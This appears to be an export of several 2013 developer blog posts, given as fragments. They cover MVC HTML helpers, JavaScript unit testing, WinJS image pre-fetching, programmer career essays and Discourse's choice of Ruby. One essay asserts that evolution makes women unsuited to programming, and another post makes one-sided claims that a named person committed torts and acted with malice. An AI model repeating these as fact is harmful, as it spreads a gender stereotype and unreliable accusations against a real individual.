width=\"1\"/>","author":"Sebastien Lambla","_id":{"$wrap":"$oid","v":1009}}

Since then our custom html-extensions have been doing great things for our project. To mention some:</p><ol><li>Standardizing the look and feel. It is far more consistent and maintainable to set attributes (including a css class) and event handlers in one centralized place.<li>Simplify the script. Often a part of the logic the script will follow is already known server side. Instead of writing everything out in javascript rendering the intended statements leads to a leaner client. There is an example in my <a href=\"http://codebetter.com/petervanooijen/2013/02/03/html-and-beyond/\">previous post</a> on building post-data.<li>Decoupling the libraries used. At the moment we are using the Telerik MVC suite. In my <a href=\"http://codebetter.com/petervanooijen/2013/02/03/html-and-beyond/\">previous post</a> I described how our html helpers build standardized Telerik components for our views. In the not to far future we want to switch to the Telerik Kendo suite. Having wrapped up the library dependency in our Html helper will make this switch a lot easier to implement.</li></ol><p>What has evolved is the way we work with the model. In MVC the implementation of the controller and the view is clear. When it comes to the implementation of the model there are almost as many different styles of implementation as there are programmers. In general the model can bring any data to the view you can imagine. Not only the source of the data varies, from plain sql to a C# property, also the use of the model’s data varies. It can be a customers name from the database. Or it can be the string representation of some html attribute needed for a fancy picker. Here data and presentation start to get mixed up. Our extensions needed information for the Html-Id. The original Html helper had a custom constructor to get that specific data from the model into the helper. Which required to create our own htmlhelper when starting the view and use that one instead of the standard @html. As seen in the <a href=\"http://codebetter.com/petervanooijen/2013/02/03/html-and-beyond/\">eposHtml in the previous story</a>. It would be cleaner if our extension methods could be satisfied with the default html helper. It would also be cleaner to keep a better separation between ‘real’ data and presentation. </p><p>The model is available in every HtmlHelper extension method.</p><div style=\"font-size: 10pt;font-family: courier;background: white;color: black\"><p style=\"margin: 0px\"><span style=\"color: blue\">public</span> <span style=\"color: blue\">static</span> PostDataBuilder&lt;TModel&gt; PostData&lt;TModel&gt;(<span style=\"color: blue\">this</span> HtmlHelper&lt;TModel&gt; htmlHelper)</p><p style=\"margin: 0px\">{</p><p style=\"margin: 0px\">    <span style=\"color: blue\">return</span> <span style=\"color: blue\">new</span> PostDataBuilder&lt;TModel&gt;(Id(<strong>htmlHelper.ViewData.Model</strong>));</p><p style=\"margin: 0px\">}</p><p style=\"margin: 0px\"> </p></div><p>It’s a property of the ViewData.</p><p>In our case we needed something to give the control an unique Id. The <strong>Id</strong> method builds that Id. Previously we passed the Id-base in the constructor, which lead to the custom helper. A far more elegant solution is using a very basic IOC-DI pattern.

The talk is going to be divided into 3 parts: 1 – recognizing and implementing testable JavaScript code, 2 – JavaScript Unit Testing fundamentals and 3 – Visual Studio integration. It is the 3rd part that I want to discuss right now. I’ve just uploaded <a href=\"http://visualstudiogallery.msdn.microsoft.com/5bb449d7-4e9b-418a-8d96-0ee77d87eecb\" target=\"_blank\">a new JavaScript unit test project template</a> to the <a href=\"http://visualstudiogallery.msdn.microsoft.com/\" target=\"_blank\">Visual Studio Gallery</a>.</p><p><a href=\"http://codebetter.com/johnvpetersen/files/2013/07/js_testing_icon.png\"><img src=\"http://codebetter.com/johnvpetersen/files/2013/07/js_testing_icon.png\" alt=\"js_testing_icon\" width=\"48\" height=\"48\" class=\"alignleft size-full wp-image-607\" /></a></p><p>There is a need for a simple unit test project that is devoted to JavaScript unit testing. For this template, I chose the jQuery QUnit project. To make full use of the template, you will also need the <a href=\"http://visualstudiogallery.msdn.microsoft.com/f8741f04-bae4-4900-81c7-7c9bfb9ed1fe\" target=\"_blank\">Chutzpah JavaScript Unit Test Runner</a> installed. Chutzpah integrates your JavaScript Unit tests.</p><p>Once the extension is installed, the add-in will be available:</p><p>(Yes, I know the project type reads as Visual C#… When I created the template, I decided to start with a class library project – like any other unit test project. I could have hosted this in a Windows Store JavaScript project – but that would have left folks out that have not upgraded to Windows 8 yet. )</p><p><a href=\"http://codebetter.com/johnvpetersen/files/2013/07/image0.png\"><img class=\"alignleft size-full wp-image-600\" alt=\"image0\" src=\"http://codebetter.com/johnvpetersen/files/2013/07/image0.png\" width=\"519\" height=\"417\" /></a></p><p>To get up and running, I added a simple Hello World QUnit JavaScript unit test. The following example shows the template in action:</p><p>Consider the following solution structure:</p><p><a href=\"http://codebetter.com/johnvpetersen/files/2013/07/image1.png\"><img class=\"alignleft size-full wp-image-594\" alt=\"image1\" src=\"http://codebetter.com/johnvpetersen/files/2013/07/image1.png\" width=\"501\" height=\"382\" /></a></p><p>This solution has 3 projects: ASP.NET MVC, MVC Unit Test and a JavaScript Unit Test Project. To illustrate how to put your web project’s js code under test, I created a myFunctionTests.js file -  which corresponds to the myFunctions.js file in the UnitTesting.Web MVC Project. Here is the code for myFunction.js:</p><pre class=\"brush: jscript; title: ; notranslate\" title=\"\">var myFunctions = (function () {var _functions = {};_functions.add = function (items) {var total = 0;for (var i in items){total += items[i];}return total;};return _functions;}());</pre><p>A very simple function that takes an array of numbers and adds them together. Here’s the test in the JavaScript Unit Test Project:<br />(Take note of how to reference the js file that hosts the function under test.)</p><pre class=\"brush: jscript; title: ; notranslate\" title=\"\">/// &lt;reference path=\"../../../unittesting.web/scripts/myfunctions.js\" /&gt;test(\"My Function Add Test\", function () {var result = myFunctions.add([1, 2, 3]);var expected = 6;ok(result == expected, \"Result: \" + result  + \", expected: \" + expected);});</pre><p>In addition, there is also a standard unit test project which was added when the MVC project was created. The following figure shows the Visual Studio Test Explorer running all of our tests (in my Test Explorer settings, I’ve opted to organize the tests by project):</p><p><a href=\"http://codebetter.com/johnvpetersen/files/2013/07/image2.png\"><img class=\"alignleft size-full wp-image-597\" alt=\"image2\" src=\"http://codebetter.com/johnvpetersen/files/2013/07/image2.png\" width=\"699\" height=\"382\" /></a></p><p>If I was to alter the test by changing the expected value to 5 and saved the file, the affected tests will run again.

Adding a new project will default against the newest framework version. Which is not constant over a solution’s life time. The result can be quite strange.

In essence, flow is characterized by complete absorption in what one does</em>. Focus, immersion, being concentrated, involvement …  being everyday in the flow by coding hours and hours, contribute a lot to a solid positive state of mind, it is a bit like meditation.  These are moments where one can completely forget about minor everyday pesky stuff, but also forget for a while more serious problem in life everyone has to face. Being in the flow is the condition to solve challenging problems and to create beautiful pieces of engineering. Being in the flow can lead to addiction but it is not addiction. This is essential to control when to check-in in the flow and when check-out, making sure to not be disturbed meantime.</p><p><strong>Being creative:</strong> Being a software engineer is one of the most mainstream way of being paid for being creative. Often, writing software is deemed to be an artistic activity. A programmer has to be humble, because this is a kind of art not understood by the mass. But being humble is a chance to become wiser and increase self-confidence. Also, knowing you are going to be creative for a while, is an excellent motivation to overcome the first step effort to jump in the flow. But the truth is that for every passionate programmer, there is a background thread in the mind in charge of creativity (often running at sleep-time), that makes it so that in the morning the envy to create what you have in mind is too strong.</p><p><strong>Becoming an expert:</strong> It is common to hear that a programmer must know numerous technologies, that its skill is to learn how to learn new technologies. On this I disagree because what makes me really happy is to master completely a technology and exercise daily my expertise. I used to master all the tricky details of C++ and COM and it was fun. Before that I used to master some assembly level programming and it was fun, I was not even getting paid for <a href=\"http://en.wikipedia.org/wiki/Amiga_demos\" target=\"_blank\">that</a>. In 2002/2003 and then  2005 I wrote two editions of a <a href=\"http://www.amazon.fr/Pratique-NET-2-0-C/dp/2841773396\" target=\"_blank\">1.000 pages book on .NET and C#</a> and writing it has been one of the most blessed moment in my career. Since then I capitalize on this knowledge every single hour of coding, letting me focus my thoughts on problems to solve, and not on all the non-trivial things a complex platform like .NET is actually performing under my feet. Of course I am constantly discovering new details about surrounding technologies, like functional programming paradigms through the prism of functional paradigm introduced in .NET languages. But I know what is my core knowledge, both in terms of technologies and in term of program design skills. And as long as I won’t be forced to change my core skills, relying on my expertise to express my creativity and making a living on top of it is a source of personal achievement.</p><p><strong>Meet inspiring people sharing the same passion:</strong> I imagine meeting peers is a source of happiness for every expert in something. This is also why investing in a solid programming particular set of skills is a positive thing. Not only respect from others programmers arise, but it lets have great exchange with smart people as passionate as you. The importance of flow, underlined above, also comes with the disadvantage of being often alone with your thoughts. Most programmers enjoy working alone anyway, but for those who need a bit of more social activity, having an expertise in something is also a great way to become <em>partly</em> a teacher (in professional or academic spheres), <em>partly</em> an architect and contribute to important decisions, <em>partly</em> a team-leader and be responsible for project progressing, <em>partly</em> a consultant, and be able to share your knowledge in a pleasant social environment. I put the word <em>partly</em> in italic because if your social activity make it so that you are not writing code meant to be run in production anymore, you shouldn’t consider you as a programmer anymore and you’ll loose a great deal of the points I am mentioning here. If you need social interactions all day long, programming is not for you. This is also why (sadly) there are so few women in software, because <a href=\"http://en.wikipedia.org/wiki/Evolutionary_psychology\" target=\"_blank\">evolution</a> designed them to be much more social beings than men.</p><p><strong>Being involved in something that make sense:</strong> Here also my position might be a bit different of what is widely accepted. I agree that for juniors, it is important to multiply the opportunities to work in several different teams and companies, to get an idea of what they like and what they don’t, to be influenced by several inspiring mentors. But once you become seniors, working on the same application in the long term, where you feel well programming in,  polishing it days after days, seeing its evolution across years, maintaining it in a clean state by adopting modern paradigms like automatic tests, DbC or relentless refactoring, having your word to say about strategic decisions, personally I found this being a great source of daily happiness and a great motivation to involve myself! In addition, working hard to achieving important milestones regularly, is an excellent way to give a sense to your professional career, which is (much) more the exception than the rule.</p><p><strong>Work wherever, whenever you like:</strong> A 2KG laptop with the proper tools set installed, a few hours of electricity every 24 hours, this is all what a programmer needs to do his job well. A descent internet connection is often appreciated, and there are today only few points on earth where internet is not available at all somehow. Programming might be probably the less demanding working activity in terms of time and space requirement. Getting in a flow in a 12 hours plane flying across the planet, scheduling half a year to live and work in a <a href=\"http://www.youtube.com/watch?v=-a2jugsYQXM\" target=\"_blank\">paradise tropical island</a>, avoiding traffic jam by staying at home for work (in your pijama), delaying programming in the night or early morning to take care of the kids and their education, all this is not only possible but pretty common actually. Most serious software companies let some of their skilled engineers work wherever they prefer. Did you know that many of the great minds behind Visual Studio didn’t actually moved with their family to Seattle, but still live in their preferred location, sometime far away from the US?</p><p><strong>Make a decent living doing something you like: </strong>Last but not least, everywhere, skilled programmers get paid above the average salary in their countries, and if we take the example of a developing country like India, good programmers get a much much higher income than the average. On top of that, a skilled programmer have pretty close to zero chances to remain unemployed for a long time. This also means that if you don’t like your current position, it is easy to find another better suited one. This situation is made possible because less than two decades ago, the modern civilization realized that IT is the condition for its development. It is a fact that many of the richest persons in the world were originally programmers and every motivated programmer has the potential to create <a href=\"http://www.ndepend.com/\" target=\"_blank\">its own ISV business</a>. A programmer can also decide to make more money by coding for the financial industry, or even bet on a startup and potentially makes millions in a few years.</p><p>All the next big things will consume even more IT, this includes human genome analysis for the mass, the entire medicine that will be deeply impacted by that, more prevalent portable devices, more sophisticated entertainments, augmented reality, robots and automated machines to do surgery, to assist the increasing growing number of old people, artificial intelligence in the long term, and certainly everything nobody hasn’t imagined yet. After all 20 years ago, nobody anticipated the impact of Google. 10 years ago nobody anticipated the impact of Facebook and smart phones.</p><p>Ok enough getting in the flow of writing my passion for programming, I have some code to write before the weekend <img src='http://codebetter.com/patricksmacchia/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /> </p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/WUQ4mwi7myE\" height=\"1\" width=\"1\"/>","author":"Patrick Smacchia","_id":{"$wrap":"$oid","v":1018}}

However, this approach is applicable by any method that implements an XMLHttpRequest.</p><p>Here’s the scenario: you have an application with several images and those images are stored on a remote server. The sources of each image is something like http://someserver.com/myimage.png. </p><p>Looking at a Windows 8 store app as an example, the good news is that your page will display immediately. Your images <em>may</em> display immediately. Or more likely, they will begin to display <em>after</em> the page has loaded. You may see the images incrementally appearing. This does not make for a good user experience. </p><p>The good news is that WinJS implements the Promise Pattern and XMLHttpRequest via the WinJS.xhr object. This means we can pre-fetch images and resolve them to blob URL’s and then bind our UI to the blob URL instead of the raw image url.</p><p>Using a stock WinJS Navigation Project, the following code is placed in the app.addEventListener(“activated”, function (args) {} handler:</p><pre class=\"brush: jscript; title: ; notranslate\" title=\"\">var promises = [];//Load the blob for the default image in the event a specified image URL does not work.WinJS.xhr({ url: \"images/no-available-image.png\", responseType: \"blob\" }).done(function(data) {var noImageBlob = URL.createObjectURL(data.response);//The imageResults.json file is a static result from the Bing Images API.WinJS.xhr({ url: \"js/imageResults.json\" }).done(function (data) {var results = JSON.parse(data.responseText);//Loop through the results to create the promise array.results.d.results[0].Image.forEach(function (element, index, array) {promises[index] = WinJS.xhr({ url: element.MediaUrl, responseType: \"blob\" }).then(function (e) {//When the promise executes, an imageBlob property is created//holding the image blob URLresults.d.results[0].Image[index].imageBlob = URL.createObjectURL(e.response);}, function error(e) {//If an error occurs when trying to retrieve the image//the No Image BLob URL created on line 28 is used insteadresults.d.results[0].Image[index].imageBlob = noImageBlob;});});//The join method kicks off the promises handed to it.//The promises can run in any order and finish at any time.//The done event for the join method fires after all of the promises//in the promise array have been fulfilled.WinJS.Promise.join(promises).done(function (e) {//Need to create a global namespace to hold a reference//to the images array. To facilitate data binding,//the WinJS.BindingList method is invoked, passing the//image array.WinJS.Namespace.define(\"ImageList\",{Images: new WinJS.Binding.List(results.d.results[0].Image)});;//Now that all of the pre-processing has occurred, we can now//navigate to the home page that displays the images.if (app.sessionState.history) {nav.history = app.sessionState.history;}args.setPromise(WinJS.UI.processAll().then(function () {if (nav.location) {nav.history.current.initialPlaceholder = true;return nav.navigate(nav.location, nav.state);}else {return nav.navigate(Application.navigator.home);}}));});}););</pre><p>JavasScript, being a dynamic language, we can simply augment the object from the parsed JSON. In this example, I used a static file from the Bing Image Search API. You will have to conform the object references to the specific API you are working with. In the previous code, we wait until all of the images have been fetch. In an async world, this can be a challenge. We don’t know what order the requests will be processed. In some cases, a server status 500 could result. This approach affords us an opportunity to handle that error with a place holder image. If on the other hand, you deal with the raw URL’s directly, you have no such opportunity to intercept errors.</p><p>On the HTML markup side, I have this code to bind an image tag’s src to the newly created imageBlob property. For this example, the raw URL that is returned in the response is MediaUrl. </p><pre class=\"brush: xml; title: ; notranslate\" title=\"\">&lt;section aria-label=\"Main content\" role=\"main\"&gt;&lt;div id=\"ImagesTemplate\" data-win-control=\"WinJS.Binding.Template\"&gt;&lt;div style=\"width: 150px; height: 100px;\"&gt;&lt;img src=\"#\" style=\"width: 60px; height: 60px;\"data-win-bind=\"alt: MediaUrl; src: imageBlob\" /&gt;&lt;div&gt;&lt;h4 data-win-bind=\"innerText: MediaUrl\"&gt;&lt;/h4&gt;&lt;/div&gt;&lt;/div&gt;&lt;/section&gt;&lt;div id=\"ImageListView\"data-win-control=\"WinJS.UI.ListView\"data-win-options=\"{itemDataSource : ImageList.Images.dataSource,itemTemplate: select('#ImagesTemplate')}\"&gt;&lt;/div&gt;</pre><p>In the markup, I have a WinJS ListView control that uses the ImageList.Images.dataSource as its datasource. The ListView also references a simple template to display the output.</p><p>Here is the result (looks a bit skewed due to this page’s dimensions):</p><p><a href=\"http://codebetter.com/johnvpetersen/files/2013/05/images.png\"><img src=\"http://codebetter.com/johnvpetersen/files/2013/05/images.png\" alt=\"images\" width=\"1792\" height=\"469\" class=\"alignleft size-full wp-image-587\" /></a> </p><p>When the page displays, because the images have already been pre-fetched, they will immediately display as well.

I’ve not commented on the #DongleGate issue – except to say that this issue has privacy, first amendment and civil litigation ramifications. Those of us witnessing this escapade have seen at least 1 guy lose his job and this just in, the complainant Adria Richards (http://butyoureagirl.com/) has lost her job as a developer evangelist for SendGrid. Here’s the blog post from her former employer: <a href=\"http://blog.sendgrid.com/a-difficult-situation/\">http://blog.sendgrid.com/a-difficult-situation/</a>.</p><p>One thing we can agree on, there is a massive lack of maturity in this business. At one time or another, including yours truly, has been guilty of an off-color joke. Most of the times, at community gatherings like conferences; we are typically amongst friends and feel comfortable that we can be ourselves, letting our guard down. At the end of the day, we must rely on the fact that in this business, we have to have a thick skin and that we are adults. That in no way is meant to justify offensive comments and that somebody like Adria didn’t have a right to be offended. She did have a right to be offended. And to that, it’s not for anybody else to question it. It’s enough for anybody to say they were offended – and others should respect that. That said, does it mean the offended have an open ended license to exact whatever retribution they want on the offenders? No…. In these community gatherings, there is a level of privacy, within the community cocoon; we have a reasonable expectation to.  </p><p>We see the t-shirt shirt = “Fork you”. We see on open source projects: “Fork me on GitHub”. Doesn’t take a rocket scientist to see the double entendre here. If one is to where that shirt in public, does that give anybody who is offended license to snap a picture, tweet it, and then hope that some misfortune befalls that person? I don’t think such license is granted. </p><p>Consider this YouTube video from Ms. Richard’s: <a href=\"http://www.youtube.com/watch?v=nMpJSKbsmgQ\">http://www.youtube.com/watch?v=nMpJSKbsmgQ</a>. There’s a saying in the law that in matters of equity, you have to have “Clean Hands.” Is it permissible for her to be offended as she was when she makes a video that could be taken as offensive by others? At about 3:03 into the video, she talks about an incident that was done to her – that could very well be taken as offensive, and she let it pass. In this case, she decided to not let something pass…something that WAS NOT said directly to her. If I was prosecuting this case, and I was going to depose Ms. Richards, this is a line of questioning I would surly explore to great details. What was her real motivation here?</p><p> This gets to my first question:</p><p>Was there a reasonable expectation of privacy by these two gentlemen? </p><p>I believe there was. They were having a private conversation, which Ms. Richards overheard. Yes, this was a public place. Did she have the right to express her indignation at those comments to these two gentlemen? Absolutely yes. In fact, that would have been the more impactful thing to do. That would be a proportional response. Reporting the incident to the PyCon staff is not appropriate. They are not there to police what people say. Note, these two guys didn’t say the comment to her. She thrust herself into their conversation. By the same token, the two guys allowed her to confront them. She didn’t. Instead, she took their picture and posted a tweet. And from there, SHE took what was a private thing and made it public. She made the situation worse. In that regard, she violated the privacy rights of these two men, notwithstanding their comments. Speaking of those comments, only her, the two guys and maybe one or two others know what the precise words were. The first result, at least one of the guys lost his job.</p><p>Next question..<br />Does the guy who got fired have a cause of action against Ms. Richards? </p><p>This is the part you want to pay attention to as you should think very carefully about the consequences of tweeting something that is private and further, identifying specific people where harm could come to them. First, did these two guys have a right to say what they said, no matter how stupid it was? Yes, they had a right. There is such a thing as a First Amendment last I checked. It’s also not illegal to be stupid. Did the guy who got fired, his employer, have a right to fire him? If he works in an employment at-will state, the answer is yes. Is he totally out of luck? No.. He can sue Ms. Richards for Tortious Interference with an Employment Relationship. She knew and intended a certain level of a negative outcome to these two gentlemen. That’s malice. While his employer may be on good ground to fire him, he can nevertheless sue Ms. Richards to recover damages. There may also be a cause of action on defamation grounds. These two guys are being labeled as sexists when all that may have happened was a joke, off color as it may have been, that offended this one person. That too may be the basis of a cause of action.</p><p>Next question..<br />Is there any other entity that could be liable?</p><p>As SendGrid has already admitted, Ms. Richard’s was there in her capacity as a representative as a SendGrid Employee. Ms. Richard’s did not do SendGrid any favors when she tweeted that she had SendGrid’s full support – a claim that SendGrid didn’t dispute. In the law, there is the legal doctrine of “Respondeat Superior.” It effectively means that the master is liable for the actions of his agent. Ms. Richards has a large Twitter following and that is due in least in part to her former job as a developer evangelist for SendGrid. There’s a strong argument to be made that SendGrid is liable, at least in part,  for Ms. Richard’s actions – regardless of the fact that they terminated her services. </p><p>This whole episode illustrates again the importance of how we react emotionally and the legal consequences therein. If I’m the gentlemen who lost his job, I’m exploring my legal options – and there are legal options. Above all, this is a teachable moment. If you are offended at something somebody does, consider the context. 99.99% of the time, these matters are best handled privately. Takes more courage and is more impactful when you communicate your disdain to the offending party directly. If your goal is to change behavior that will more likely have the desired effect. Sure, you may be told to eff-off.  That’s a risk…a risk worth taking. </p><p>How about conference organizers?</p><p>I understand that PyCon has modified their code of condut… Didn’t know that such a thing existed. I would always suggest to any conference organizer to NOT get into the business of policing their attendees. Rather, I’d rely on the venue staff for that. Obviously, if somebody is disruptive, boot their tails out. These guys didn’t appear to be disruptive at all for the record – not that it really matters in this case.</p><p>A word about the “Brogrammer” culture..</p><p>You probably know about it. If not, look it up on our favorite search engine. The fact is, guys are often not the sharpest knives in the drawer socially and are often in need of an increase in maturity level. Women have a tough enough time in this business. I know several women that do a lot of work in getting more girls interested in software development. Sad as it is, Adria Richards did more to set that effort back than the two guys she was offended by. That’s a perfect example of irony!! It’s really a shame. Ms. Richards looks to be a pretty sharp individual – one who appears to have better common sense than she displayed here. Learn from it folks. </p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/lMFZbIXzErE\" height=\"1\" width=\"1\"/>","author":"johnvpetersen","_id":{"$wrap":"$oid","v":1020}}

Sorry.</a> That was closed, too, either because it was seen as a 'recommend me a job' or because it's too specific to programming. Pick your interpretation.</p><p>I am sympathetic to this quandary because <b>career questions, by their very nature, tend to be so narrow and opinionated</b> that they are frequently only useful to the person who asked – which is completely counter to the goal of Stack Exchange. You know, endless permutations of things like \"My boss Jeff is a total jerk, he constantly changes my code without asking and overrides me all the time with his BS arbitrary decisions, should I quit?\"* I can understand deciding to outlaw the entire class of career questions because they're frequently soft, opinion-y, and highly specific to the person asking. It's easier to throw out the whole category rather than do the painful work of sifting through them all to reveal those few rare workable gems.</p><p>Stack Exchange wants <b>questions that are as useful to as many people as possible</b>, and actively closes (sorry, <a href=\"http://meta.stackoverflow.com/questions/173497/every-close-has-its-thorn-replace-close-with-on-hold-for-the-first-five-d\">\"puts on hold\"</a>) the ones that are not.

Overshoot and you get either \"Too Broad\" or \"Too Localized\". Hitting that target with our questions – or at least making a best faith effort to attempt to, anyway – is how we maximize the results of our collective efforts. Write once, read many.</p><p>But back to the topic: <b>what career options are available to programmers who no longer want to program?</b> I feel there <i>is</i> a way to answer this question that would be helpful to many other programmers, that <i>is</i> supported by facts and data and science.</p><p>Programming is indeed a field that <a href=\"http://www.codinghorror.com/blog/2008/12/programming-love-it-or-leave-it.html\">does require some passion</a>. If you've been programming for a few years and haven't developed a taste for it by now, it seems doubtful to me that anyone would suddenly develop one overnight. However, if you were able to stick with doing something you're not very enthusiastic about for a period of years, maybe there's still a kernel of something there to work with. Or perhaps you're just wearing golden handcuffs.</p><p><img alt=\"Golden-handcuffs\" title=\"Golden-handcuffs\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017eeaaf686e970d-800wi\" width=\"600\" height=\"253\" /></p><p>Environment plays a big part in any job, no matter <a href=\"http://online.wsj.com/article/SB10001424127887324874204578439154095008558.html\">how intrinsically amazing that job might be</a>.

I have seen the future of programming, my friends, and it is terrible CRUD apps running on Wintel boxes!</p><p>Of course, we went on to build Stack Overflow in Microsoft .NET. That's a big reason it's still as fast as it is. So one of the most frequently asked questions after we <a href=\"http://www.codinghorror.com/blog/2013/02/civilized-discourse-construction-kit.html\">announced Discourse</a> was:<p><blockquote><p>Why didn't you build Discourse in .NET, too?</p></blockquote></p><p>Let me be clear about something: I <i>love</i> .NET. One of the greatest thrills of my professional career was getting the opportunity to place a Coding Horror sticker in the hand of <a href=\"http://en.wikipedia.org/wiki/Anders_Hejlsberg\">Anders Hejlsberg</a>. Pardon my inner fanboy for a moment, but oh man I still get chills. There are maybe fifty world class computer language designers on the planet. Anders is the only one of them who built Turbo Pascal and Delphi. It is thanks to Anders' expert guidance that .NET started out such a remarkably well designed language – literally what Java should have been on every conceivable level – and has continued to evolve in remarkably practical ways over the last 10 years, leveraging the strengths of other influential dynamically typed languages.</p><p><img alt=\"Turbo-pascal\" title=\"Turbo-pascal\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d42306e26970c-800wi\" width=\"700\" height=\"395\" /></p><p>All that said, it's true that I intentionally chose <i>not</i> to use .NET for my next project. So you might expect to find an angry, righteous screed here about how much happier I am leaving the oppressive shackles of my Microsoft masters behind. <i>Free at last, free at least, thank God almighty I'm free at last!</i</p><p>Sorry. <a href=\"http://www.codinghorror.com/blog/2007/05/giving-up-on-microsoft.html\">I already wrote that post five years ago</a>.</p><p>Like any pragmatic programmer, I pick the appropriate tool for the job at hand. And as much as I may love .NET, <b>it would be an extraordinarily poor choice for an 100% open source project like Discourse.</b> Why? Three reasons, mainly:</p><ol><li><p><b>The licensing.</b> My God, <i>the licensing</i>. It's not so much the money, as the infernal, mind-bending tax code level complexity involved in making sure all your software is properly licensed: determining what 'level' and 'edition' you are licensed at, who is licensed to use what, which servers are licensed... wait, what? Sorry, I passed out there for a minute when I was attacked by <a href=\"http://www.codinghorror.com/blog/2009/07/oh-you-wanted-awesome-edition.html\">rabid licensing weasels</a>.</p><p>I'm not inclined to make grand pronouncements about the future of software, but if anything kills off commercial software, let me tell you, it won't be open source software. They needn't bother. Commercial software will gleefully strangle itself to death on its own licensing terms.</p></li><li><p><b>The friction</b>. If you want to build truly viable open source software, you need people to contribute to your project, so that it is a living, breathing, growing thing. And unless you can download all the software you need to hack on your project freely from all over the Internet, no strings attached, there's just … too much friction.</p>If Stack Overflow taught me anything, it is that we now live in a world where the next brilliant software engineer can come from anywhere on the planet. I'm talking places <a href=\"http://www.codinghorror.com/blog/2009/03/the-ugly-american-programmer.html\">this ugly American programmer</a> has never heard of, where they speak crazy nonsense moon languages I can't understand. But get this. Stand back while I blow your mind, people: these brilliant programmers <i>still code in the same keywords we do!</i> I know, crazy, right?</p><p>Getting up and running with a Microsoft stack is just plain too hard for a developer in, say, Argentina, or Nepal, or Bulgaria. Open source operating systems, languages, and tool chains are the great equalizer, the basis for the next great generation of programmers all over the world who are going to help us change the world.</p></li><li><p><b>The ecosystem</b>. When I was at Stack Exchange <a href=\"http://blog.stackoverflow.com/2012/02/stack-exchange-open-source-projects/\">we strove mightily</a> to make as much of our infrastructure open source as we could. It was something that we made explicit in the compensation guidelines, this idea that we would all be (partially) judged by how much we could do in public, and try to leave behind as many useful, public artifacts of our work as we could. Because wasn't all of Stack Exchange itself, from the very first day, <a href=\"http://blog.stackoverflow.com/2009/06/stack-overflow-creative-commons-data-dump/\">built on your Creative Commons contributions</a> that we all share ownership of?</p><p>You can certainly build open source software in .NET. And many do. But it never feels natural. It never feels right. Nobody accepts your patch to a core .NET class library no matter how hard you try. It always feels like you're swimming upstream, in a world of small and large businesses using .NET that really aren't interested in sharing their code with the world – probably because they know it would suck if they did, anyway. It is just not a native part of the Microsoft .NET culture to make things open source, <i>especially not the things that suck</i>. If you are afraid the things you share will suck, that fear will render you incapable of truly and deeply giving back. The most, uh, delightful… bit of open source communities is how they aren't afraid to let it \"all hang out\", so to speak.</p><p>So as a result, for any given task in .NET you might have – if you're lucky – a choice of maybe two decent-ish libraries. Whereas in any popular open source language, you'll <i>easily</i> have a dozen choices for the same task. Yeah, maybe six of them will be broken, obsolete, useless, or downright crazy. But hey, even factoring in some natural open source spoilage, you're still ahead by a factor of three! <i>A winner is you!</i></p></li></ol><p>As I wrote <a href=\"http://www.codinghorror.com/blog/2007/05/giving-up-on-microsoft.html\">five years ago</a>:</p><blockquote>I'm a pragmatist. For now, I choose to live in the Microsoft universe. But that doesn't mean I'm ignorant of how the other half lives. There's always more than one way to do it, and just because I chose one particular way doesn't make it the right way – or even a particularly good way. Choosing to be provincial and insular is a sure-fire path to ignorance. Learn how the other half lives. Get to know some developers who don't live in the exact same world you do. Find out what tools they're using, and why. If, after getting your feet wet on both sides of the fence, you decide the other half is living better and you want to join them, then I bid you a fond farewell.</blockquote></p>I no longer live in the Microsoft universe any more. Right, wrong, good, evil, that's just how it turned out for the project we wanted to build.</p><img alt=\"Im-ok-with-this\" title=\"Im-ok-with-this\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017c38010328970b-800wi\" width=\"596\" height=\"329\" /><p>However, I'd also be lying if I didn't mention that I truly believe the sort of project we are building in Discourse does represent most future software. If you squint your eyes a little, I think you can see a future not too far in the distance where .NET is a specialized niche outside the mainstream.<p>But <b>why Ruby?</b> Well, the short and not very glamorous answer is that I had narrowed it down to either Python or Ruby, and my original co-founder <a href=\"http://eviltrout.com/\">Robin Ward</a> has been building major Rails apps since 2006. So that clinched it.</p><p>I've always been a little intrigued by Ruby, mostly because of <a href=\"https://sites.google.com/site/steveyegge2/tour-de-babel\">the absolutely gushing praise Steve Yegge had for the language way back in 2006</a>. I've never forgotten this.</p><blockquote><p>For the most part, Ruby took Perl's string processing and Unix integration as-is, meaning the syntax is identical, and so right there, before anything else happens, you already have the Best of Perl. And that's a great start, especially if you don't take the Rest of Perl.</p><p>But then Matz took the best of list processing from Lisp, and the best of OO from Smalltalk and other languages, and the best of iterators from CLU, and pretty much the best of everything from everyone.</p><p>And he somehow made it all work together so well that you don't even notice that it has all that stuff. I learned Ruby faster than any other language, out of maybe 30 or 40 total; it took me about 3 days before I was more comfortable using Ruby than I was in Perl, after eight years of Perl hacking. It's so consistent that you start being able to guess how things will work, and you're right most of the time. It's beautiful. And fun. And practical.</p></blockquote><p>Steve is one of those polyglot programmers I <a href=\"http://www.codinghorror.com/blog/2012/07/but-you-did-not-persuade-me.html\">respect so much</a> that I basically just take whatever his opinion is, provided it's not about something wacky like gun control or feminism or T'Pau, and accept it as fact.</p><p>I apologize, Steve. I'm sorry it took me 7 years to get around to Ruby. But maybe I was better off waiting a while anyway:</p><ul><li><p>Ruby is a decent performer, but you really need to <b>throw fast hardware at it for good performance</b>. Yeah, I know, <a href=\"http://www.codinghorror.com/blog/2006/02/the-day-performance-didnt-matter-any-more.html\">interpreted languages are what they are</a>, and caching, database, network, blah blah blah. Still, we obtained the absolute fastest CPUs you could buy for the Discourse servers, 4.0 Ghz Ivy Bridge Xeons, and performance is just … <i>good</i> on today's fastest hardware. Not great. <i>Good.</i></p><p>Yes, I'll admit that I am utterly spoiled by the JIT compiled performance of .NET. That's what I am used to.  I do sometimes pine away for the bad old days of .NET when we could build pages that serve in well under 50 milliseconds without thinking about it too hard. Interpreted languages aren't going to be able to reach those performance levels. But I can only imagine how rough Ruby performance had to be back in the dark ages of 2006 when CPUs and servers were <i>five times slower than they are today!</i> I'm so very glad that I am hitting Ruby now, with the strong wind of many solid years of Moore's law at our backs.</p></p><li><p>Ruby is <b>maturing up nicely</b> in the <a href=\"http://www.ruby-lang.org/en/news/2013/02/24/ruby-2-0-0-p0-is-released/\">2.0 language release</a>, which happened not more than a month after Discourse was announced. So, yes, the downside is that Ruby is slow. But the upside 